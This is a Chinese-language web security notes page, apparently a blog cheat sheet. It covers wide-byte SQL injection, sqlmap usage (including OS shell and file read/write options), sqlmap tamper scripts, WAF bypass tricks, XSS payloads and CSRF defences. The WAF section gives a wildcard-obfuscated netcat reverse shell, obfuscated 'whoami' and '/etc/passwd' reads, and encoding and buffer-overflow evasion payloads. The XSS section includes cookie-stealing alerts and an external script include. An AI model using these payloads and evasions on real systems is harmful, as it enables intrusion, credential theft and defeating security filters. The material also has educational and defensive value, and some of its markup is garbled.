<p>%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。<br>1<br>2.1 常用连接语句符号<br>or，and，union，&amp;&amp;，||，^<br>1<br>^指的是异或操作，通常用于布尔型盲注绕过连接词</p>
<p>2.2 几个报错注入用来绕过的函数<br>extractvalue/updatexml</p>
<p>解释太复杂了，这里有详解，点这里</p>
<p>2.7 \N,E0，.0绕过<br>其实相当于NULL字符</p>
<p>mysql&gt; select<em>from sql_test where id =\Nunion select </em> from sql_test where id=2;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      |+——+—————+—————+1 row in set (0.00 sec)</p>
<p>mysql&gt; select<em>from sql_test where id =8E0union select </em> from sql_test where id=2;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      |+——+—————+—————+1 row in set (0.00 sec) mysql&gt; select<em>from sql_test where id =8.0union select </em> from sql_test where id=2;+——+—————+—————+| id | username | password |+——+—————+—————+|  2 | test     | 234      |+——+—————+—————+1 row in set (0.06 sec)</p>
<p>mysql&gt; select<em>from sql_test where id =7E0;Empty set (0.00 sec) mysql&gt; select</em>from sql_test where id </p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>多个url注入：sqlmap.py -m urls.txt</p>
<p>txt格式如下：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.79.130/sqli/Less-1/?id=1">http://192.168.79.130/sqli/Less-1/?id=1</a><br><a target="_blank" rel="noopener" href="http://192.168.79.130/sqli/Less-2/?id=1">http://192.168.79.130/sqli/Less-2/?id=1</a><br><a target="_blank" rel="noopener" href="http://192.168.79.130/sqli/Less-3/?id=1">http://192.168.79.130/sqli/Less-3/?id=1</a><br>手机移动站点注入：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://www.mobile.com?Id=1”--mobile">http://www.mobile.com?Id=1”--mobile</a></p>
<p>智能测试注入：sqlmap.py -u“<a target="_blank" rel="noopener" href="http://192.168.79.130/sqli/Less-1/?id=1”--batch">http://192.168.79.130/sqli/Less-1/?id=1”--batch</a> —smart</p>
<p>—batch 自动选择yes</p>
<p>—smart 启发式快速判断，节约浪费时间</p>
<p>post及cookie注入：sqlmap.py -r burpsuite抓包.txt</p>
<p>txt格式如下:</p>
<p>POST /vuln.php HTTP/1.1<br>Host: www.test.com<br>User-Agent: Mozilla/4.0</p>
<p>id=1<br>指定参数注入：sqlmap.py -r post.txt -p 注入参数</p>
<p>指定表单注入：sqlmap -u URL -data “username=a&amp;password=a”</p>
<p>sqlmap表单注入：sqlmap.py -u URL -froms</p>
<p>信息枚举(可以组合使用):</p>
<p>复制代码<br>-a, —all                 获取所有信息<br>-b, —banner              获取数据库管理系统的标识<br>—current-user            获取数据库管理系统当前用户<br>—current-db              获取数据库管理系统当前数据库<br>—hostname                获取数据库服务器的主机名称<br>—is-dba                　检测DBMS当前用户是否DBA<br>—users                   枚举数据库管理系统用户<br>—passwords               枚举数据库管理系统用户密码哈希<br>—privileges              枚举数据库管理系统用户的权限<br>—roles                   枚举数据库管理系统用户的角色<br>—dbs                     枚举数据库管理系统数据库<br>—tables                  枚举的DBMS数据库中的表<br>—columns                 枚举DBMS数据库表列<br>—schema                  枚举数据库架构<br>—count                   检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url —count -D testdb<br>—dump                    转储数据库表项<br>—dump-all                转储数据库所有表项<br>—search                  搜索列（S），表（S）和/或数据库名称（S）<br>—comments                获取DBMS注释<br>-D DB                     要进行枚举的指定数据库名<br>-T TBL                    DBMS数据库表枚举<br>-C COL                    DBMS数据库表列枚举<br>-X EXCLUDECOL             DBMS数据库表不进行枚举<br>-U USER                   用来进行枚举的数据库用户<br>—exclude-sysdbs          枚举表时排除系统数据库<br>—pivot-column=P..        Pivot columnname<br>—where=DUMPWHERE         Use WHEREcondition while table dumping<br>—start=LIMITSTART        获取第一个查询输出数据位置<br>—stop=LIMITSTOP          获取最后查询的输出数据<br>—first=FIRSTCHAR         第一个查询输出字的字符获取<br>—last=LASTCHAR           最后查询的输出字字符获取<br>—sql-query=QUERY         要执行的SQL语句<br>—sql-shell               提示交互式SQL的shell<br>—sql-file=SQLFILE        要执行的SQL文件<br>复制代码</p>
<p>系统文件操作</p>
<p>—file-read “文件路径”  据库服务器中读取文件</p>
<p>—file-write “本地文件路径”，—file-dest “目标文件路径”    把文件上传到目标服务器</p>
<p>—os cmd, —os-shell    运行任意操作系统命令</p>
<p>绕过waf常用方法（可以使用一种或多种组合使用）：</p>
<p>检测waf类型：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”--identify-waf">http://test.com/test.php?Id=1”--identify-waf</a></p>
<p>使用代理：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —proxy=<a href="http://127.0.0.1:8080（代理地址）">http://127.0.0.1:8080（代理地址）</a></p>
<p>延迟连接：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —delay=3 （单位为秒）</p>
<p>使用随机Usre-Agent：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —random-agent（过安全狗有点用）</p>
<p>指定User-Agent：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —user-agent=”Firefox/xxx”</p>
<p>调整并发线程数：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —threads=4（线程数）</p>
<p>指定Referer字段：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”--referer=&quot;https://www.baidu.com/index.html">http://test.com/test.php?Id=1”--referer=&quot;https://www.baidu.com/index.html</a>“</p>
<p>更换错误请求：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —safe-url（正常的网站）</p>
<p>使用sqlmap自带的过waf脚本：sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/test.php?Id=1”">http://test.com/test.php?Id=1”</a> —tamper[“脚本名称”]（如果脚本失效，可以自定义脚本）</p>
<p>注：脚本文件位于sqlmap文件夹下的tamper文件夹里面</p>
<p>复制代码<br>apostrophemask.py             用UTF-8全角字符替换单引号字符<br>apostrophenullencode.py       用非法双字节unicode字符替换单引号字符<br>appendnullbyte.py             在payload末尾添加空字符编码<br>base64encode.py               对给定的payload全部字符使用Base64编码<br>between.py                    分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”<br>bluecoat.py                   在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”<br>chardoubleencode.py           对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）<br>charencode.py                 对给定的payload全部字符使用URL编码（不处理已经编码的字符）<br>charunicodeencode.py          对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）<br>concat2concatws.py            用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例<br>equaltolike.py                用“LIKE”运算符替换全部等于号“=”<br>greatest.py                   用“GREATEST”函数替换大于号“&gt;”<br>halfversionedmorekeywords.py  在每个关键字之前添加MySQL注释<br>ifnull2ifisnull.py            用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例<br>lowercase.py                  用小写值替换每个关键字字符<br>modsecurityversioned.py       用注释包围完整的查询<br>modsecurityzeroversioned.py   用当中带有数字零的注释包围完整的查询<br>multiplespaces.py             在SQL关键字周围添加多个空格<br>nonrecursivereplacement.py    用representations替换预定义SQL关键字，适用于过滤器<br>overlongutf8.py               转换给定的payload当中的所有字符<br>percentage.py                 在每个字符之前添加一个百分号<br>randomcase.py                 随机转换每个关键字字符的大小写<br>randomcomments.py             向SQL关键字中插入随机注释<br>securesphere.py               添加经过特殊构造的字符串<br>sp_password.py                向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs<br>space2comment.py              用“/**/”替换空格符<br>space2dash.py                 用破折号注释符“—”其次是一个随机字符串和一个换行符替换空格符<br>space2hash.py                 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符<br>space2morehash.py             用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符<br>space2mssqlblank.py           用一组有效的备选字符集当中的随机空白符替换空格符<br>space2mssqlhash.py            用磅注释符“#”其次是一个换行符替换空格符<br>space2mysqlblank.py           用一组有效的备选字符集当中的随机空白符替换空格符<br>space2mysqldash.py            用破折号注释符“—”其次是一个换行符替换空格符<br>space2plus.py                 用加号“+”替换空格符<br>space2randomblank.py          用一组有效的备选字符集当中的随机空白符替换空格符<br>unionalltounion.py            用“UNION SELECT”替换“UNION ALL SELECT”<br>unmagicquotes.py              用一个多字节组合%bf%27和末尾通用注释一起替换空格符 宽字节注入<br>varnish.py                    添加一个HTTP头“X-originating-IP”来绕过WAF<br>versionedkeywords.py          用MySQL注释包围每个非函数关键字<br>versionedmorekeywords.py      用MySQL注释包围每个关键字<br>xforwardedfor.py              添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</p>
<h1 id="waf-绕过"><a href="#waf-绕过" class="headerlink" title="waf 绕过"></a>waf 绕过</h1><p>Waf = Web Application Firewall ，web应用防火墙，简单来说就是在http协议层面对我们的数据包进行检测，如果发现了可能是带有攻击性的语句，就会进行拦截。<br>对关键字进行不同编码</p>
<p>select <em> from zzz = select </em> from  %257a%257a%257a  //url编码<br>单引号 = %u0027、%u02b9、%u02bc   // Unicode编码<br>adminuser = 0x61646D696E75736572 // 部分十六进制编码<br>空格 = %20 %09 %0a %0b %0c %0d %a0  //各类编码</p>
<p>对关键字进行大小写变换</p>
<p>Union select = uNIoN sELecT<br>通过其他语义相同的关键字替换</p>
<p>And = &amp;&amp;<br>Or = ||<br>等于 = like 或综合&lt;与&gt;判断<br>if(a,b,c) = case when(A) then B else C end<br>substr(str,1,1) = substr (str) from 1 for 1<br>limit 1,1 = limit 1 offset 1<br>Union select 1,2 = union select * from ((select 1)A join (select 2)B;<br>hex()、bin() = ascii()<br>sleep() = benchmark()<br>concat_ws() = group_concat()<br>mid()、substr() = substring()<br>@@user = user()<br>@@datadir = datadir()<br>除了通过编码等价替换等方式绕过检测，我们还能配合目标特性实现绕过检测</p>
<p>配合Windows特性</p>
<p>whoami = ((((Wh^o^am””i))))      //利用符号分割字符执行whoami</p>
<p>whoami = set a=net&amp;&amp;b=user&amp;&amp;call %a%%b%   //利用变量分割关键字执行whoami</p>
<p>set a=123whoami456      // 为了方便演示这里设置一个变量<br>echo %a:~3,6%          // 取出变量a的第3位开始共计6个字符<br>%a:~3,6%                //执行取出的值，通过截取系统变量然后拼接可以绕过大部分检测</p>
<p>配合Linxu特性</p>
<p>whoami = w’h’o’a’m”i”  //单引号或双引号连接符，需要闭合</p>
<p>Cat /etc/passwd = cat /?t<em>/??ss**  //?,</em>通配符<br>whoami = /b[12312i]n/w[23sh]oa[2msh]i //[] 通配符，匹配【】中的字符</p>
<p>Whoami = a=who&amp;&amp;b=ami&amp;&amp;$a$b     //当然linux下也可以变量拼接</p>
<p>cat /../../etc/passwd =cd ..&amp;&amp;cd ..&amp;&amp;cd etc&amp;&amp;cat passwd  //目录穿越, /被拦截</p>
<p>Shell反弹也可以配合特性使用</p>
<p>nc -e /bin/bash 127.0.0.1 1234 =/??n/?c -e /??n/b??h 2130706433 1234 //（127.0.0.1 → 2130706433）<br>配合Mysql特性</p>
<p>/**/数据库注释符，中间部分被注释，可用于截断关键字，干扰waf匹配</p>
<p>User() = user/<strong>/()   //  注释符/</strong>/也可以用于替换空格<br>Union select = /<em>95554</em>/Union/<em>test123</em>/select<br>/!/内敛注释，中间部分继续执行，mysql特有</p>
<p>User() = /<em>!user/</em>123<em>/()</em>/   //  /<em>!</em>/内部继续执行<br>Union select = /<em>!union</em>//<em>123</em>//<em>!select</em>/   //组合<br>%0a换行与#单行注释符配合使用</p>
<p>Union select = union#A%0aselect //用#注释，再用%0a逃出注释继续执行后面语句<br>配合过滤代码或漏洞本身</p>
<p>关键字被过滤，双写关键字</p>
<p>and = anandd      //将关键字过滤掉后剩下的内容组成新的关键字<br>通过chr()函数变换关键字</p>
<p>phpinfo() = chr (80).chr (72).chr (80).chr (73).chr (78).chr (70).chr (79).chr (40).chr (41)   //将acsii码通过chr()函数转换回来<br>通过base_convert() 函数变换关键字</p>
<p>phpinfo = base_convert(27440799224,10,32)  //从10进制转换成32进制<br>http协议绕过<br>原理：理解不了恶意语句就不会拦截</p>
<p>Content-Type绕过</p>
<p>有的waf 识别到Content-Type类型为multipart/form-data后，会将它认为是文件上传请求，从而不检测其他种类攻击只检测文件上传，导致被绕过。</p>
<p>application/x-www-form-urlencoded è multipart/form-data<br>HTTP请求方式绕过</p>
<p>waf在对危险字符进行检测的时候，分别为post请求和get请求设定了不同的匹配规则，请求被拦截，变换请求方式有几率能绕过检测</p>
<p>Ps:云锁/安全狗安装后默认状态对post请求检测力度较小，可通过变换请求方式绕过</p>
<p>参数污染绕过</p>
<p>由于http协议允许同名参数的存在，同时waf的处理机制对同名参数的处理方式不同，造成“参数污染”。不同的服务器搭配会对传递的参数解析出不同的值。配合waf与中间件对参数解析位置不同，可能绕过waf。</p>
<p>提交的参数为：?id=1&amp;id=2&amp;id=exp<br>asp.net+iis:id=1,2,exp<br>asp+iis:id=1,2,exp<br>php+apache:id=exp<br>解析特性绕过</p>
<p>原理：利用waf与后端服务器的解析不一致。</p>
<p>Iis5.0-6.0解析漏洞</p>
<p>.asp —&gt; /xx.asp/xx.jpg  //.asp，.asa目录下的文件都解析成asp文件<br>.asp —&gt; xx.asp;.jpg     //服务器默认不解析;号后面的内容<br>Iis7.5解析漏洞(php.ini开启fix_pathinfo)</p>
<p>.php —&gt; /xx.jpg         //上传.jpg一句话，访问时后面加上/xx.php<br>apache解析漏洞</p>
<p>.php —&gt; /test.php.php123     //从右往左，能别的后缀开始解析<br>nginx解析漏洞(php.ini开启fix_pathinfo)</p>
<p>.php —&gt; xxx.jpg%00.php      //Nginx &lt;8.03 空字节代码执行漏洞<br>多Content-Disposition绕过</p>
<p>请求包中包含多个Content-Disposition时，中间件与waf取值不同</p>
<p>解析兼容性绕过</p>
<p>在http协议中，标准的文件名的形式为filename=”1.php”,但是web容器会在解析协议时做一些兼容，文件上传时，有的waf只按照标准协议去解析，解析不到文件名，从而被绕过。</p>
<p>filename=”test.php  filename=test.php  filename=‘test.php‘<br>keep-alive（Pipeline）绕过</p>
<p>原理:http请求头部中有Connection这个字段，建立的tcp连接会根据此字段的值来判断是否断开，我们可以手动将此值置为keep-alive，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf</p>
<p>发送两个请求，但绕过失败，被云锁拦截，此种方法现在基本失效。</p>
<p>分块传输绕过</p>
<p>原理:分块编码传输将关键字and,or,select ,union等关键字拆开编码，绕过waf等安全设备的检测，但无法绕过代码本身的检测。</p>
<p>修改编码方式：Charset绕过</p>
<p>原理:大部分的WAF默认用UTF8编码检测，修改编码方式可能会绕过waf，例如设置charset为ibm037</p>
<p>Waf检测限制绕过<br>原理：超出waf检测能力部分不会拦截</p>
<p>参数溢出</p>
<p>原理:通过增加传递得参数数量，达到waf检测上限，超出的参数就可绕过waf了。可绕一些轻量级waf，如phpstudy自带waf。</p>
<p>设置拦截关键字</p>
<p>添加参数数量，成功绕过</p>
<p>缓冲区溢出</p>
<p>原理:当服务器可以处理的数据量大于waf时，这种情况可以通过发送大量的垃圾数据将 WAF 溢出，从而绕过waf。</p>
<p>UnIoN SeLeCT = and (select 1)=(Select 0xA*99999) UnIoN SeLeCT<br>and 1=1 = and 1=1 and 99…99999   //此处省略N多个9<br>网络结构绕过<br>原理：不经过安全设备就不会拦截</p>
<p>源ip绕过</p>
<p>原理：直接对源地址发起攻击，流量不会经过waf，从而成功绕过。</p>
<p>正常访问流量</p>
<p>攻击者流量</p>
<p>同网段/ssrf绕过</p>
<p>同理, 因同网段的流量属于局域网，可能不经过waf的检测<br>参考: <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/259027.html">https://www.freebuf.com/articles/web/259027.html</a></p>
<hr>
<h2 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss 跨站脚本攻击"></a>xss 跨站脚本攻击</h2><h3 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h3><p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p>
<h3 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h3><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
<h3 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a>DOM型XSS：</h3><p>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：DOM文档对象模型</p>
<p>XSS的攻击载荷<br>以下所有标签的 &gt; 都可以用 // 代替， 例如 <script>alert(1)&lt;/script//</p>
<p><script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中</p>
<p><script>alert("hack")</script>   #弹出hack</p>
<p><script>alert(/hack/)</script>   #弹出hack</p>
<p><script>alert(1)</script>        #弹出1，对于数字可以不用引号</p>
<p><script>alert(document.cookie)</script>      #弹出cookie</p>
<p><script src="http://xxx.com/xss.js"></script>  #引用外部的xss<br>svg标签 </p>
<p><svg onload="alert(1)"/></p>
<p><svg onload="alert(1)" <img="">标签：</svg></p>
<p><img src="/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/1" οnerrοr="alert("hack")"><br><img src="/q0o0p-wow/q0o0p-wow.github.io/2020/10/15/re/1" οnerrοr="alert(document.cookie)">  #弹出cookie<br> <body>标签：</body></p>
<p><body οnlοad="alert(1)"></body></p>
<p><body οnpageshοw="alert(1)"><br>video标签:</body></p>
<p><video οnlοadstart="alert(1)" src="/media/hack-the-planet.mp4"><br>style标签：</video></p>
<p><style οnlοad="alert(1)"></style><br>XSS可以插在哪里？<br>用户输入作为script标签内容<br>用户输入作为HTML注释内容<br>用户输入作为HTML标签的属性名<br>用户输入作为HTML标签的属性值<br>用户输入作为HTML标签的名字<br>直接插入到CSS里<br>最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</p>
<h1 id="用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过"><a href="#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过" class="headerlink" title="用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过"></a>用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</h1><!-- 用户输入 -->
<!-- --><script>alert('hack')</script><!-- -->
<h1 id="用户输入作为标签属性名，导致攻击者可以进行闭合绕过"><a href="#用户输入作为标签属性名，导致攻击者可以进行闭合绕过" class="headerlink" title="用户输入作为标签属性名，导致攻击者可以进行闭合绕过"></a>用户输入作为标签属性名，导致攻击者可以进行闭合绕过</h1><div 用户输入="xx">  </div>
<div></div><script>alert('hack')</script><div a="xx"> </div>

<h1 id="用户输入作为标签属性值，导致攻击者可以进行闭合绕过"><a href="#用户输入作为标签属性值，导致攻击者可以进行闭合绕过" class="headerlink" title="用户输入作为标签属性值，导致攻击者可以进行闭合绕过"></a>用户输入作为标签属性值，导致攻击者可以进行闭合绕过</h1><div id="用户输入"></div>
<div id></div><script>alert('hack')</script><div a="x"></div>

<h1 id="用户输入作为标签名，导致攻击者可以进行闭合绕过"><a href="#用户输入作为标签名，导致攻击者可以进行闭合绕过" class="headerlink" title="用户输入作为标签名，导致攻击者可以进行闭合绕过"></a>用户输入作为标签名，导致攻击者可以进行闭合绕过</h1><p>&lt;用户输入  id=”xx” /&gt;<br>&lt;&gt;<script>alert('hack')</script><b id="xx"></b></p>
<h1 id="用户输入作为CSS内容，导致攻击者可以进行闭合绕过"><a href="#用户输入作为CSS内容，导致攻击者可以进行闭合绕过" class="headerlink" title="用户输入作为CSS内容，导致攻击者可以进行闭合绕过"></a>用户输入作为CSS内容，导致攻击者可以进行闭合绕过</h1><p><style>用户输入<style></p>
<p><style> </style><script>alert('hack')</script><style> </style><br>XSS漏洞的挖掘<br>黑盒测试</p>
<p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
<p>URL的每一个参数<br>URL本身<br>表单<br>搜索框<br>常见业务场景</p>
<p>重灾区：评论区、留言区、个人信息、订单信息等<br>针对型：站内信、网页即时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性等</p>
<p>白盒测试(代码审计)</p>
<p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p>
<p>PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>
<p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
<p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p>
<p>XSS的攻击过程<br>反射型XSS漏洞：</p>
<p>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。<br>Tom 发现 Bob的站点存在反射性的XSS漏洞<br>Tom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击<br>Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接<br>嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。<br>Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制<br>存储型XSS漏洞：</p>
<p>Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。<br>Tom检测到Bob的站点存在存储型的XSS漏洞。<br>Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。<br>Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。<br>Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击</p>
<h3 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h3><p>存储型的XSS危害最大。因为他存储在服务器端，所以不需要我们和被攻击者有任何接触，只要被攻击者访问了该页面就会遭受攻击。</p>
<p>而反射型和DOM型的XSS则需要我们去诱使用户点击我们构造的恶意的URL，需要我们和用户有直接或者间接的接触，比如利用社会工程学或者利用在其他网页挂马的方式。</p>
<p>XSS防御的总体思路是：对输入(和URL参数)进行过滤，对输出进行编码。</p>
<h2 id="CSRF-“跨站请求伪造”"><a href="#CSRF-“跨站请求伪造”" class="headerlink" title="CSRF “跨站请求伪造”"></a>CSRF “跨站请求伪造”</h2><p>攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
<p>XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
<h3 id="CSRF漏洞测试"><a href="#CSRF漏洞测试" class="headerlink" title="CSRF漏洞测试"></a>CSRF漏洞测试</h3><p>检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<p>随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下：使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
<h3 id="预防CSRF攻击"><a href="#预防CSRF攻击" class="headerlink" title="预防CSRF攻击"></a>预防CSRF攻击</h3><ol>
<li>验证HTTP Referer字段<br>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a target="_blank" rel="noopener" href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</li>
</ol>
<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
<p>验证Referer方式总结</p>
<p>优点：使用方便，开发简单，一定程度上能预防CSRF攻击；<br>缺点：这种机制完全依托于浏览器，Referer字段容易被故意篡改，或者被禁用。</p>
<ol>
<li>请求中添加token并验证<br>token就是服务端返回给客户端类似sessionid那样一长串的类值（长是为了防暴力猜解）。csrf依赖于浏览器该问链接时自动对应网站的cookie带上，token不放cookie（一般form表单加个hidden属性的input标签来存放）csrf就没法获取token，这样我们就可以通过检测发送过来的数据包中是否有正确的token值来决定是否响应请求。</li>
</ol>
<p>在讲清token防御的原理后，我们再来讲token的设计，因为token方式给人的感觉很复杂令人望而生畏。</p>
<p>我们首先明确一个问题，就是能够防止csrf攻击的token，并不需要每次请求都不一样，在用户登录后到退出前的这整个过程中的所有请求token完全可以是一样。因为（在基于没有其他漏洞会泄漏本次会话的token的设想下）黑客是无法获取用户的tokne，所以又何必每个请求都要生成一个新的token呢。（token每次请求都要不一样的想法是受防重放攻击的影响）只考滤防csrf不考滤防重放的情况下，token设计就简单多了。</p>
<p>使用sessionid作为token设计：在csrf中cookie是浏览器自己带上的，本质而言用户的sessionid并未丢失（也就是攻击者并不能知道sessionid是多少），基于此我们完全可以不用另传一个值只需直接将sessionid作为token即可（或者也可以做些运算比如取sessionid的某些值做个md5来做为token，意思都差不多）。判断代码类似 if session[“id”] == $_POST[“token”]</p>
<p>与sessionid同时返回的token设计：在生成sessionid的同时生成一个token（服务端token可以存于session变量中）返回给客户端，客户端保存该token每次请求时都在form表单中提交该值。判断代码类似if session[“token”] == $_POST[“token”]</p>
